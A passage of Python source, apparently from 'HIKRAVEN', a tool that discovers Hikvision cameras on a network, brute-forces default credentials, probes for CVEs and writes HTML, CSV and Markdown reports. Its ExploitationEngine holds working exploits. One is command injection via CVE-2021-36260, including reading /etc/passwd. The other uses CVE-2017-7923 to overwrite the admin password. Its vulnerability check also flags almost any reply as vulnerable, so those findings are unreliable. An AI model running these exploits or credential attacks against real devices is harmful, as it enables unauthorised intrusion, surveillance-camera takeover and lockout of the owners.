        with ThreadPoolExecutor(max_workers=self.config.get('scan.max_threads', 100)) as executor:
            futures = {}
            for ip in devices_to_scan:
                future = executor.submit(self._scan_ports, ip, ports, timeout)
                futures[future] = ip
            
            for future in as_completed(futures):
                ip = futures[future]
                try:
                    open_ports = future.result(timeout=10)
                    if open_ports and ip in self.discovered_devices:
                        self.discovered_devices[ip].open_ports = open_ports
                except Exception as e:
                    self.logger.debug(f"Port scan error for {ip}: {e}")
    
    def _scan_ports(self, ip: str, ports: List[int], timeout: float) -> List[int]:
        open_ports = []
        
        for port in ports:
            if self._stop_scan:
                break
            try:
                self.rate_limiter.wait_if_needed()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
        
        return open_ports
    
    @safe_operation()
    def _scan_subnet(self, subnet: str):
        self.logger.info(f"Scanning subnet: {subnet}")
        
        try:
            network = ipaddress.ip_network(subnet, strict=False)
            hosts = list(network.hosts())
            
            max_hosts = self.config.get('discovery.max_hosts', 65535)
            if len(hosts) > max_hosts:
                hosts = hosts[:max_hosts]
                self.logger.warning(f"Limiting scan to {max_hosts} hosts")
            
            self.logger.info(f"Ping scanning {len(hosts)} hosts...")
            active_hosts = []
            
            with ThreadPoolExecutor(max_workers=self.config.get('scan.max_threads', 100)) as executor:
                futures = {}
                for host in hosts:
                    ip = str(host)
                    if ip != self.local_ip:
                        future = executor.submit(self._ping_host, ip)
                        futures[future] = ip
                
                for future in tqdm(as_completed(futures), total=len(futures), 
                                 desc="Ping scanning"):
                    ip = futures[future]
                    try:
                        if future.result(timeout=5):
                            active_hosts.append(ip)
                    except Exception:
                        pass
            
            self.logger.info(f"Found {len(active_hosts)} active hosts")
            
            if active_hosts:
                self.logger.info("Port scanning active hosts...")
                ports = self.config.get('discovery.ports', Constants.HIKVISION_PORTS)
                timeout = self.config.get('discovery.port_scan_timeout', 1.5)
                
                with ThreadPoolExecutor(max_workers=self.config.get('scan.max_threads', 100)) as executor:
                    futures = {}
                    for ip in active_hosts:
                        future = executor.submit(self._scan_ports, ip, ports, timeout)
                        futures[future] = ip
                    
                    for future in tqdm(as_completed(futures), total=len(futures),
                                     desc="Port scanning"):
                        ip = futures[future]
                        try:
                            open_ports = future.result(timeout=10)
                            if open_ports:
                                if ip not in self.discovered_devices:
                                    device = HikDevice(
                                        ip_address=ip, 
                                        open_ports=open_ports,
                                        interface=self.interface
                                    )
                                    self.discovered_devices[ip] = device
                                else:
                                    self.discovered_devices[ip].open_ports = open_ports
                        except Exception:
                            pass
                            
        except Exception as e:
            self.logger.error(f"Subnet scan error: {e}")
    
    def _ping_host(self, ip: str) -> bool:
        try:
            if platform.system() == 'Windows':
                result = subprocess.run(
                    ['ping', '-n', '1', '-w', '2000', ip],
                    capture_output=True,
                    timeout=3
                )
            elif platform.system() == 'Android':
                result = subprocess.run(
                    ['ping', '-c', '1', '-W', '2', ip],
                    capture_output=True,
                    timeout=3
                )
                if result.returncode == 0:
                    return True
                result = subprocess.run(
                    ['ping', '-c', '1', '-w', '2', ip],
                    capture_output=True,
                    timeout=3
                )
            else:
                result = subprocess.run(
                    ['ping', '-c', '1', '-W', '2', ip],
                    capture_output=True,
                    timeout=3
                )
            return result.returncode == 0
        except:
            return False
    
    def _enrich_devices(self):
        self.logger.debug("Enriching device information...")
        
        for ip, device in self.discovered_devices.items():
            if not device.hostname:
                try:
                    hostname = socket.gethostbyaddr(ip)[0]
                    device.hostname = hostname
                except:
                    pass
            
            if not device.mac_address:
                mac = get_mac_from_ip(ip)
                if mac:
                    device.mac_address = mac
            
            if 80 in device.open_ports or 443 in device.open_ports:
                self._get_web_info(device)
            
            if not device.is_cloud_managed:
                self._check_cloud_management(device)
    
    @safe_operation()
    def _get_web_info(self, device: HikDevice):
        port = 443 if 443 in device.open_ports else 80
        protocol = 'https' if port == 443 else 'http'
        url = f"{protocol}://{device.ip_address}:{port}"
        
        try:
            response = requests.get(f"{url}/web/", timeout=5, verify=False)
            if response.status_code == 200:
                text = response.text
                
                match = re.search(r'var model\s*=\s*"([^"]+)"', text)
                if match and not device.model:
                    device.model = match.group(1)
                
                match = re.search(r'var firmwareVersion\s*=\s*"([^"]+)"', text)
                if match and not device.firmware_version:
                    device.firmware_version = match.group(1)
                
                match = re.search(r'var softwareVersion\s*=\s*"([^"]+)"', text)
                if match and not device.software_version:
                    device.software_version = match.group(1)
                
                match = re.search(r'var serialNumber\s*=\s*"([^"]+)"', text)
                if match and not device.serial_number:
                    device.serial_number = match.group(1)
                
                match = re.search(r'var activated\s*=\s*"([^"]+)"', text)
                if match and not device.activation_status:
                    device.activation_status = match.group(1)
        except:
            pass
    
    @safe_operation()
    def _check_cloud_management(self, device: HikDevice):
        if 80 not in device.open_ports and 443 not in device.open_ports:
            return
        
        port = 443 if 443 in device.open_ports else 80
        protocol = 'https' if port == 443 else 'http'
        
        try:
            response = requests.get(
                f"{protocol}://{device.ip_address}:{port}/cloud",
                timeout=3,
                verify=False
            )
            if response.status_code == 200 and 'hik-connect' in response.text.lower():
                device.is_cloud_managed = True
                device.tags.append('cloud-managed')
        except:
            pass
    
    def stop(self):
        self._stop_scan = True

class RateLimiter:
    def __init__(self, max_requests_per_second: int = 20):
        self.max_requests = max_requests_per_second
        self.tokens = max_requests_per_second
        self.last_refill = time.time()
        self.lock = threading.Lock()
        self.request_times = deque(maxlen=1000)
    
    def wait_if_needed(self):
        with self.lock:
            current_time = time.time()
            
            time_passed = current_time - self.last_refill
            self.tokens = min(self.max_requests, 
                             self.tokens + time_passed * self.max_requests)
            self.last_refill = current_time
            
            while self.request_times and current_time - self.request_times[0] > 1:
                self.request_times.popleft()
            
            if len(self.request_times) >= self.max_requests:
                oldest = self.request_times[0]
                wait_time = 1 - (current_time - oldest)
                if wait_time > 0:
                    time.sleep(wait_time)
            
            if self.tokens < 1:
                wait_time = 1.0 / self.max_requests
                time.sleep(wait_time)
                self.tokens = 0
            else:
                self.tokens -= 1
            
            self.request_times.append(time.time())
    
    def reset(self):
        with self.lock:
            self.request_times.clear()
            self.tokens = self.max_requests
            self.last_refill = time.time()

class VulnerabilityScanner:
    def __init__(self, logger: Logger, config: ConfigManager,
                 rate_limiter: RateLimiter = None):
        self.logger = logger
        self.config = config
        self.rate_limiter = rate_limiter or RateLimiter(
            config.get('scan.rate_limit', 20)
        )
        self.session = self._setup_session()
        self.db = Database()
        self.vulnerability_signatures = Constants.CVE_SIGNATURES
        self.found_vulnerabilities = []
    
    def _setup_session(self) -> requests.Session:
        session = requests.Session()
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        session.verify = False
        session.timeout = self.config.get('scan.timeout', 10)
        return session
    
    @timing_decorator
    def scan_device(self, device: HikDevice) -> Dict[str, List[dict]]:
        self.logger.debug(f"Scanning {device.ip_address} for vulnerabilities...")
        
        results = {
            'cves': [],
            'weak_credentials': [],
            'exposures': [],
            'misconfigurations': []
        }
        
        cves_to_check = self.config.get('vulnerability.cves', 
                                        list(self.vulnerability_signatures.keys()))
        
        for cve_id in cves_to_check:
            if cve_id in self.vulnerability_signatures:
                signature = self.vulnerability_signatures[cve_id]
                if self._check_vulnerability(device.ip_address, signature):
                    vuln = {
                        'cve_id': cve_id,
                        'description': signature['description'],
                        'severity': signature['severity'],
                        'cvss_score': signature.get('cvss', 0.0),
                        'category': signature.get('category', 'UNKNOWN'),
                        'url': f"http://{device.ip_address}{signature['path']}"
                    }
                    results['cves'].append(vuln)
                    device.add_vulnerability(
                        cve_id=cve_id,
                        severity=signature['severity'],
                        description=signature['description'],
                        cvss_score=signature.get('cvss', 0.0),
                        proof=f"Vulnerable endpoint: {signature['path']}",
                        category=signature.get('category', 'UNKNOWN')
                    )
                    self.logger.warning(f"Found {cve_id} on {device.ip_address}")
                    self.db.save_vulnerability(device.ip_address, vuln)
                    self.found_vulnerabilities.append(vuln)
        
        if self.config.get('vulnerability.check_default_creds', True):
            if device.open_ports and any(p in device.open_ports for p in Constants.HTTP_PORTS):
                self._check_default_credentials(device, results)
        
        return results
    
    def _check_vulnerability(self, ip: str, signature: dict) -> bool:
        try:
            self.rate_limiter.wait_if_needed()
            
            port = 443 if signature.get('https', False) else 80
            protocol = 'https' if port == 443 else 'http'
            url = f"{protocol}://{ip}{signature['path']}"
            
            if signature.get('method') == 'GET':
                response = self.session.get(
                    url,
                    params=signature.get('params', {}),
                    timeout=self.config.get('vulnerability.timeout_per_check', 5)
                )
            else:
                response = self.session.post(
                    url,
                    data=signature.get('payload', ''),
                    timeout=self.config.get('vulnerability.timeout_per_check', 5)
                )
            
            if response.status_code in [200, 401, 403]:
                detection = signature.get('detection', '')
                if detection and detection in response.text:
                    return True                
                try:
                    root = ET.fromstring(response.content)
                    status = root.find('statusCode')
                    if status is not None and status.text == '1':
                        return True
                    if len(response.content) > 50:
                        return True
                except:
                    pass
                
                if len(response.content) > 0 and response.status_code == 200:
                    return True
            
            return False
            
        except Exception:
            return False
    
    def _check_default_credentials(self, device: HikDevice, results: dict):
        self.logger.debug(f"Checking default credentials on {device.ip_address}")
        
        port = 443 if 443 in device.open_ports else 80
        protocol = 'https' if port == 443 else 'http'
        base_url = f"{protocol}://{device.ip_address}"
        
        checked = 0
        max_checks = self.config.get('vulnerability.max_checks_per_device', 20)
        
        for username, password in Constants.DEFAULT_CREDS[:max_checks]:
            if self._check_auth(base_url, username, password):
                result = {
                    'username': username,
                    'password': password,
                    'type': 'default_credential'
                }
                results['weak_credentials'].append(result)
                device.credentials.append((username, password))
                device.tags.append('default-creds')
                self.logger.warning(f"Default credentials found: {username}:{password}")
                break
            
            checked += 1
            if checked >= max_checks:
                break
    
    def _check_auth(self, base_url: str, username: str, password: str) -> bool:
        try:
            self.rate_limiter.wait_if_needed()
            
            auth = base64.b64encode(f"{username}:{password}".encode()).decode()
            headers = {'Authorization': f'Basic {auth}'}
            
            response = self.session.get(
                f"{base_url}/Security/users",
                headers=headers,
                timeout=self.config.get('vulnerability.timeout_per_check', 5)
            )
            
            return response.status_code == 200
            
        except Exception:
            return False

class ExploitationEngine:
    def __init__(self, logger: Logger, config: ConfigManager,
                 rate_limiter: RateLimiter = None):
        self.logger = logger
        self.config = config
        self.rate_limiter = rate_limiter or RateLimiter(
            config.get('scan.rate_limit', 10)
        )
        self.session = self._setup_session()
        self.exploited_devices = []
        self._safe_mode = config.get('exploitation.safe_mode', True)
    
    def _setup_session(self) -> requests.Session:
        session = requests.Session()
        session.verify = False
        session.timeout = self.config.get('scan.timeout', 10)
        return session
    
    @safe_operation()
    def exploit_cve_2021_36260(self, device: HikDevice) -> Optional[Dict]:
        if self._safe_mode:
            self.logger.info(f"Testing CVE-2021-36260 on {device.ip_address} (safe mode)")
        else:
            self.logger.warning(f"Attempting CVE-2021-36260 exploit on {device.ip_address}")
        
        results = {
            'success': False,
            'output': None,
            'method': 'CVE-2021-36260'
        }
        
        try:
            self.rate_limiter.wait_if_needed()
            url = f"http://{device.ip_address}/SDK/webLanguage"
            
            test_commands = ["whoami", "id", "uname -a"]
            
            if not self._safe_mode:
                test_commands.append("cat /etc/passwd")
            
            for cmd in test_commands:
                payload = f'''<?xml version="1.0" encoding="UTF-8"?>
                <language>en$( {cmd} )</language>'''
                
                response = self.session.post(url, data=payload, timeout=10)
                
                if response.status_code == 200:
                    try:
                        root = ET.fromstring(response.content)
                        output = ET.tostring(root, encoding='unicode')
                        if output and len(output) > 100:
                            results['success'] = True
                            results['output'] = output[:500]
                            self.logger.success(f"Command '{cmd}' executed successfully")
                            break
                    except:
                        pass
                
                time.sleep(0.5)
            
            if results['success']:
                self.exploited_devices.append(device.ip_address)
                device.tags.append('exploited')
            
            return results
            
        except Exception as e:
            self.logger.debug(f"Exploit error: {e}")
            return None
    
    @safe_operation()
    def exploit_cve_2017_7923(self, device: HikDevice) -> Dict:
        if self._safe_mode:
            self.logger.info(f"Testing CVE-2017-7923 on {device.ip_address} (safe mode)")
            return {'success': False, 'new_password': None, 'method': 'CVE-2017-7923'}
        else:
            self.logger.warning(f"Attempting CVE-2017-7923 exploit on {device.ip_address}")
        
        results = {
            'success': False,
            'new_password': None,
            'method': 'CVE-2017-7923'
        }
        
        try:
            self.rate_limiter.wait_if_needed()
            url = f"http://{device.ip_address}/Security/users/1"
            
            for username, password in Constants.DEFAULT_CREDS[:5]:
                auth = base64.b64encode(f"{username}:{password}".encode()).decode()
                headers = {'Authorization': f'Basic {auth}'}
                
                new_password = generate_secure_password(16)
                
                xml = f'''<?xml version="1.0" encoding="UTF-8"?>
                <User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">
                    <id>1</id>
                    <userName>admin</userName>
                    <password>{new_password}</password>
                </User>'''
                
                response = self.session.put(url, headers=headers, data=xml, timeout=10)
                
                if response.status_code == 200:
                    try:
                        root = ET.fromstring(response.content)
                        status = root.find('statusCode')
                        if status is not None and status.text == '1':
                            results['success'] = True
                            results['new_password'] = new_password
                            self.logger.success(f"Password changed to: {new_password}")
                            self.exploited_devices.append(device.ip_address)
                            device.tags.append('exploited')
                            break
                    except:
                        pass
                
                time.sleep(0.5)
            
            return results
            
        except Exception as e:
            self.logger.debug(f"Exploit error: {e}")
            return results

class ReportGenerator:
    def __init__(self, logger: Logger, config: ConfigManager):
        self.logger = logger
        self.config = config
        self.db = Database()
    
    def generate(self, devices: List[HikDevice], formats: List[str] = None) -> List[str]:
        if formats is None:
            formats = self.config.get('reporting.formats', ['json', 'html', 'csv'])
        
        output_dir = self.config.get('reporting.output_dir', Constants.OUTPUT_DIR)
        os.makedirs(output_dir, exist_ok=True)
        
        reports = []
        
        for fmt in formats:
            try:
                if fmt == 'json':
                    report = self._generate_json(devices, output_dir)
                elif fmt == 'html':
                    report = self._generate_html(devices, output_dir)
                elif fmt == 'csv':
                    report = self._generate_csv(devices, output_dir)
                elif fmt == 'pdf':
                    report = self._generate_pdf(devices, output_dir)
                elif fmt == 'markdown':
                    report = self._generate_markdown(devices, output_dir)
                else:
                    self.logger.warning(f"Unsupported format: {fmt}")
                    continue
                
                reports.append(report)
                self.logger.success(f"Report generated: {report}")
                
            except Exception as e:
                self.logger.error(f"Failed to generate {fmt} report: {e}")
        
        return reports
    
    def _generate_json(self, devices: List[HikDevice], output_dir: str) -> str:
        timestamp = get_timestamp()
        output_file = os.path.join(output_dir, f"hikraven_report_{timestamp}.json")
        
        report_data = {
            'generated': datetime.now().isoformat(),
            'platform': detect_platform(),
            'total_devices': len(devices),
            'vulnerable_devices': sum(1 for d in devices if d.get_vulnerability_count() > 0),
            'total_vulnerabilities': sum(d.get_vulnerability_count() for d in devices),
            'severity_summary': self._get_severity_summary(devices),
            'devices': [d.to_dict() for d in devices]
        }
        
        with open(output_file, 'w') as f:
            json.dump(report_data, f, indent=2)
        
        if self.config.get('reporting.compress', False):
            try:
                with open(output_file, 'rb') as f:
                    compressed = zlib.compress(f.read())
                with open(f"{output_file}.gz", 'wb') as f:
                    f.write(compressed)
                os.remove(output_file)
                output_file = f"{output_file}.gz"
            except:
                pass
        
        return output_file
    
    def _generate_html(self, devices: List[HikDevice], output_dir: str) -> str:
        timestamp = get_timestamp()
        output_file = os.path.join(output_dir, f"hikraven_report_{timestamp}.html")
        
        vulnerable_count = sum(1 for d in devices if d.get_vulnerability_count() > 0)
        total_vulns = sum(d.get_vulnerability_count() for d in devices)
        severity_summary = self._get_severity_summary(devices)
        
        html = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HIKRAVEN - Security Assessment Report</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
            background: #0a0e27; 
            padding: 20px;
            color: #e0e0e0;
        }}
        .container {{ 
            max-width: 1400px; 
            margin: 0 auto; 
            background: linear-gradient(135deg, #0f1328, #1a1a3e);
            padding: 30px; 
            border-radius: 16px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.5);
            border: 1px solid rgba(0, 212, 255, 0.1);
        }}
        .header {{
            background: linear-gradient(135deg, #0a0e27, #1a1a3e);
            padding: 30px;
            border-radius: 12px;
            margin-bottom: 30px;
            border: 1px solid rgba(0, 212, 255, 0.2);
        }}
        .header h1 {{ 
            font-size: 32px; 
            background: linear-gradient(90deg, #00d4ff, #00ff88);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }}
        .header .subtitle {{ color: #666; margin-top: 8px; }}
        
        .stats {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }}
        .stat-card {{
            background: rgba(255,255,255,0.05);
            padding: 20px;
            border-radius: 12px;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.1);
            transition: all 0.3s ease;
        }}
        .stat-card:hover {{
            transform: translateY(-2px);
            border-color: #00d4ff;
        }}
        .stat-card .number {{
            font-size: 30px;
            font-weight: bold;
            background: linear-gradient(90deg, #00d4ff, #00ff88);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }}
        .stat-card .label {{ color: #888; font-size: 13px; margin-top: 5px; }}
        .stat-card.danger .number {{ background: linear-gradient(90deg, #ff0040, #ff6b6b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }}
        .stat-card.warning .number {{ background: linear-gradient(90deg, #ffd700, #ff6b00); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }}
        .stat-card.success .number {{ background: linear-gradient(90deg, #00ff88, #00d4ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }}
        
        .device {{
            border: 1px solid rgba(255,255,255,0.1);
            padding: 20px;
            margin: 15px 0;
            border-radius: 12px;
            background: rgba(255,255,255,0.03);
            transition: all 0.3s ease;
        }}
        .device:hover {{
            border-color: #00d4ff;
            background: rgba(0, 212, 255, 0.05);
        }}
        .device-header {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            flex-wrap: wrap;
            gap: 10px;
        }}
        .device-ip {{
            font-size: 18px;
            font-weight: 600;
            color: #00d4ff;
        }}
        .vulnerable {{ border-left: 4px solid #ff0040; }}
        .safe {{ border-left: 4px solid #00ff88; }}
        
        .badge {{
            display: inline-block;
            padding: 4px 14px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            letter-spacing: 0.5px;
        }}
        .badge-danger {{ background: #ff0040; color: white; }}
        .badge-warning {{ background: #ffd700; color: #1a1a3e; }}
        .badge-success {{ background: #00ff88; color: #1a1a3e; }}
        .badge-info {{ background: #00d4ff; color: #1a1a3e; }}
        .badge-critical {{ background: #ff0000; color: white; animation: pulse 2s infinite; }}
        
        @keyframes pulse {{
            0% {{ opacity: 1; }}
            50% {{ opacity: 0.5; }}
            100% {{ opacity: 1; }}
        }}
        
        .port {{
            background: rgba(0, 212, 255, 0.2);
            color: #00d4ff;
            padding: 2px 12px;
            border-radius: 12px;
            margin: 2px;
            display: inline-block;
            font-size: 12px;
            border: 1px solid rgba(0, 212, 255, 0.2);
        }}
        
        table {{
            width: 100%;
            border-collapse: collapse;
            margin-top: 10px;
        }}
        th, td {{
            padding: 8px 12px;
            text-align: left;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }}
        th {{
            background: rgba(0, 212, 255, 0.1);
            font-weight: 600;
            color: #00d4ff;
        }}
        
        .severity-critical {{ background: rgba(255, 0, 64, 0.3); color: #ff0040; padding: 2px 10px; border-radius: 12px; font-size: 12px; border: 1px solid #ff0040; }}
        .severity-high {{ background: rgba(255, 0, 64, 0.2); color: #ff6b6b; padding: 2px 10px; border-radius: 12px; font-size: 12px; border: 1px solid #ff6b6b; }}
        .severity-medium {{ background: rgba(255, 215, 0, 0.2); color: #ffd700; padding: 2px 10px; border-radius: 12px; font-size: 12px; border: 1px solid #ffd700; }}
        .severity-low {{ background: rgba(0, 212, 255, 0.2); color: #00d4ff; padding: 2px 10px; border-radius: 12px; font-size: 12px; border: 1px solid #00d4ff; }}
        
        .footer {{
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid rgba(255,255,255,0.05);
            color: #555;
            font-size: 13px;
        }}
        
        .tag {{
            display: inline-block;
            padding: 2px 10px;
            border-radius: 12px;
            font-size: 11px;
            margin: 2px;
            background: rgba(0, 212, 255, 0.1);
            color: #00d4ff;
            border: 1px solid rgba(0, 212, 255, 0.1);
        }}
        
        .severity-bar {{
            height: 4px;
            border-radius: 2px;
            margin: 5px 0;
            background: linear-gradient(90deg, #00ff88, #ffd700, #ff0040);
        }}
        
        .interface-info {{
            background: rgba(0, 212, 255, 0.05);
            padding: 4px 12px;
            border-radius: 12px;
            font-size: 12px;
            color: #00d4ff;
            border: 1px solid rgba(0, 212, 255, 0.1);
        }}
        
        @media (max-width: 768px) {{
            .container {{ padding: 15px; }}
            .header {{ padding: 20px; }}
            .device-header {{ flex-direction: column; align-items: flex-start; }}
            .stats {{ grid-template-columns: 1fr 1fr; }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 HIKRAVEN Security Report</h1>
            <div class="subtitle">Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</div>
            <div class="subtitle">Platform: {platform.system()} {platform.release()}</div>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <div class="number">{len(devices)}</div>
                <div class="label">Total Devices</div>
            </div>
            <div class="stat-card danger">
                <div class="number">{vulnerable_count}</div>
                <div class="label">Vulnerable Devices</div>
            </div>
            <div class="stat-card warning">
                <div class="number">{total_vulns}</div>
                <div class="label">Total Vulnerabilities</div>
            </div>
            <div class="stat-card success">
                <div class="number">{len(devices) - vulnerable_count}</div>
                <div class="label">Secure Devices</div>
            </div>
        </div>
        
        <div class="stats">
            {''.join(f'<div class="stat-card"><div class="number">{count}</div><div class="label">{severity}</div></div>' for severity, count in severity_summary.items())}
        </div>
'''
        
        for device in devices:
            vuln_count = device.get_vulnerability_count()
            status_class = "vulnerable" if vuln_count > 0 else "safe"
            threat_level = device.get_threat_level()
            
            html += f'''
        <div class="device {status_class}">
            <div class="device-header">
                <span class="device-ip">{device.ip_address}</span>
                <div>
                    <span class="badge {'badge-danger' if vuln_count > 0 else 'badge-success'}">
                        {vuln_count} vulnerabilities
                    </span>
                    {f'<span class="badge badge-info">☁️ Cloud</span>' if device.is_cloud_managed else ''}
                    {f'<span class="badge badge-critical">⚠️ {threat_level}</span>' if threat_level != 'INFO' else ''}
                    {f'<span class="interface-info">📡 {device.interface}</span>' if device.interface else ''}
                </div>
            </div>
            
            <table>
                <tr><td><strong>MAC:</strong></td><td>{device.mac_address or 'N/A'}</td></tr>
                <tr><td><strong>Hostname:</strong></td><td>{device.hostname or 'N/A'}</td></tr>
                <tr><td><strong>Model:</strong></td><td>{device.model or 'N/A'}</td></tr>
                <tr><td><strong>Manufacturer:</strong></td><td>{device.manufacturer or 'N/A'}</td></tr>
                <tr><td><strong>Firmware:</strong></td><td>{device.firmware_version or 'N/A'}</td></tr>
                <tr><td><strong>Software:</strong></td><td>{device.software_version or 'N/A'}</td></tr>
                <tr><td><strong>Serial:</strong></td><td>{device.serial_number or 'N/A'}</td></tr>
                <tr><td><strong>Open Ports:</strong></td>
                    <td>{''.join(f'<span class="port">{p}</span>' for p in device.open_ports) or 'None'}</td>
                </tr>
                <tr><td><strong>Tags:</strong></td>
                    <td>{''.join(f'<span class="tag">{tag}</span>' for tag in device.tags) or 'None'}</td>
                </tr>
'''
            
            if device.vulnerabilities:
                html += '''
                <tr><td><strong>Vulnerabilities:</strong></td>
                    <td>
'''
                for vuln in device.vulnerabilities:
                    severity = vuln.get('severity', 'low').lower()
                    category = vuln.get('category', '')
                    html += f'''
                        <span class="severity-{severity}">{vuln.get('cve_id', 'UNKNOWN')}</span>
                        <span style="font-size:12px; color:#888;">{vuln.get('description', '')}</span>
                        {f'<span style="font-size:11px; color:#666;">[{category}]</span>' if category else ''}<br>
'''
                html += '''
                    </td></tr>
'''
            
            if device.credentials:
                html += '''
                <tr><td><strong>Weak Credentials:</strong></td>
                    <td><span style="color:#ff0040;">
'''
                for username, password in device.credentials:
                    html += f"{username}:{password} "
                html += '''
                    </span></td></tr>
'''
            
            if vuln_count > 0:
                score = min(device.get_severity_score(), 100)
                html += f'''
                <tr><td><strong>Risk Score:</strong></td>
                    <td><div class="severity-bar" style="width:{score}%;"></div>{score}/100</td></tr>
'''
            
            html += '''
            </table>
        </div>
'''
        
        html += f'''
        <div class="footer">
            <p>Report generated by HIKRAVEN</p>
            <p style="font-size:12px; margin-top:5px; color:#444;">
                ⚠️ This report is for authorized security testing only.
            </p>
        </div>
    </div>
</body>
</html>
'''
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(html)
        
        return output_file
    
    def _generate_csv(self, devices: List[HikDevice], output_dir: str) -> str:
        import csv
        
        timestamp = get_timestamp()
        output_file = os.path.join(output_dir, f"hikraven_report_{timestamp}.csv")
        
        with open(output_file, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow([
                'IP Address', 'MAC Address', 'Hostname', 'Model', 'Manufacturer',
                'Firmware Version', 'Software Version', 'Serial Number',
                'Open Ports', 'Vulnerabilities', 'CVE IDs', 'Cloud Managed', 
                'Threat Level', 'Confidence', 'Interface'
            ])
            
            for device in devices:
                cve_ids = ';'.join(v.get('cve_id', '') for v in device.vulnerabilities)
                writer.writerow([
                    device.ip_address,
                    device.mac_address or '',
                    device.hostname or '',
                    device.model or '',
                    device.manufacturer or '',
                    device.firmware_version or '',
                    device.software_version or '',
                    device.serial_number or '',
                    ';'.join(str(p) for p in device.open_ports),
                    device.get_vulnerability_count(),
                    cve_ids,
                    'Yes' if device.is_cloud_managed else 'No',
                    device.get_threat_level(),
                    device.confidence,
                    device.interface or ''
                ])
        
        return output_file
    
    def _generate_pdf(self, devices: List[HikDevice], output_dir: str) -> str:
        self.logger.warning("PDF generation not implemented, using HTML instead")
        return self._generate_html(devices, output_dir)
    
    def _generate_markdown(self, devices: List[HikDevice], output_dir: str) -> str:
        timestamp = get_timestamp()
        output_file = os.path.join(output_dir, f"hikraven_report_{timestamp}.md")
        
        md = f"""# HIKRAVEN Security Assessment Report

**Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}  
**Platform:** {platform.system()} {platform.release()}

## Executive Summary

- **Total Devices:** {len(devices)}
- **Vulnerable Devices:** {sum(1 for d in devices if d.get_vulnerability_count() > 0)}
- **Total Vulnerabilities:** {sum(d.get_vulnerability_count() for d in devices)}

## Device Inventory

"""
        
        for device in devices:
            vuln_count = device.get_vulnerability_count()
            md += f"""
### {device.ip_address}
- **MAC:** {device.mac_address or 'N/A'}
- **Hostname:** {device.hostname or 'N/A'}
- **Model:** {device.model or 'N/A'}
- **Firmware:** {device.firmware_version or 'N/A'}
- **Open Ports:** {', '.join(str(p) for p in device.open_ports) or 'None'}
- **Vulnerabilities:** {vuln_count}
- **Threat Level:** {device.get_threat_level()}
- **Cloud Managed:** {'Yes' if device.is_cloud_managed else 'No'}
- **Interface:** {device.interface or 'N/A'}

"""
            if device.vulnerabilities:
                md += "**Vulnerabilities:**\n"
                for vuln in device.vulnerabilities:
                    md += f"- {vuln.get('cve_id', 'UNKNOWN')}: {vuln.get('description', '')}\n"
                md += "\n"
            
            if device.credentials:
                md += "**Weak Credentials Found:**\n"
                for username, password in device.credentials:
                    md += f"- {username}:{password}\n"
                md += "\n"
        
        md += """
---
*Report generated by HIKRAVEN - For authorized security testing only*
"""
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(md)
        
        return output_file
    
    def _get_severity_summary(self, devices: List[HikDevice]) -> dict:
        summary = defaultdict(int)
        for device in devices:
            for vuln in device.vulnerabilities:
                severity = vuln.get('severity', 'UNKNOWN')
                summary[severity] += 1
        return dict(summary)

class PluginManager:
    def __init__(self, logger: Logger, config: ConfigManager):
        self.logger = logger
        self.config = config
        self.plugins = {}
        self.plugin_dir = self.config.get('plugins.directory', Constants.PLUGIN_DIR)
        os.makedirs(self.plugin_dir, exist_ok=True)
    
    def load_plugins(self):
        if not self.config.get('plugins.enabled', True):
            return
        
        self.logger.debug("Loading plugins...")
        
        plugin_files = [f for f in os.listdir(self.plugin_dir) 
                       if f.endswith('.py') and not f.startswith('__')]
        
        for plugin_file in plugin_files:
            try:
                plugin_name = plugin_file[:-3]
                spec = importlib.util.spec_from_file_location(
                    plugin_name, 
                    os.path.join(self.plugin_dir, plugin_file)
                )
                module = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(module)
                
                if hasattr(module, 'Plugin'):
                    plugin_class = getattr(module, 'Plugin')
                    plugin = plugin_class()
                    self.plugins[plugin_name] = plugin
                    self.logger.debug(f"Loaded plugin: {plugin_name}")
            except Exception as e:
                self.logger.debug(f"Failed to load plugin {plugin_file}: {e}")
    
    def execute_hook(self, hook_name: str, *args, **kwargs):
        results = []
        for plugin_name, plugin in self.plugins.items():
            if hasattr(plugin, hook_name):
                try:
                    result = getattr(plugin, hook_name)(*args, **kwargs)
                    if result:
                        results.append(result)
                except Exception as e:
                    self.logger.debug(f"Plugin {plugin_name} hook {hook_name} failed: {e}")
        return results

class HikRaven:
    def __init__(self):
        self.config = ConfigManager()
        self.logger = None
        self.db = Database()
        self.sudo_manager = SudoManager()
        self.interface_manager = InterfaceManager()
        self.discovery_engine = None
        self.vulnerability_scanner = None
        self.exploitation_engine = None
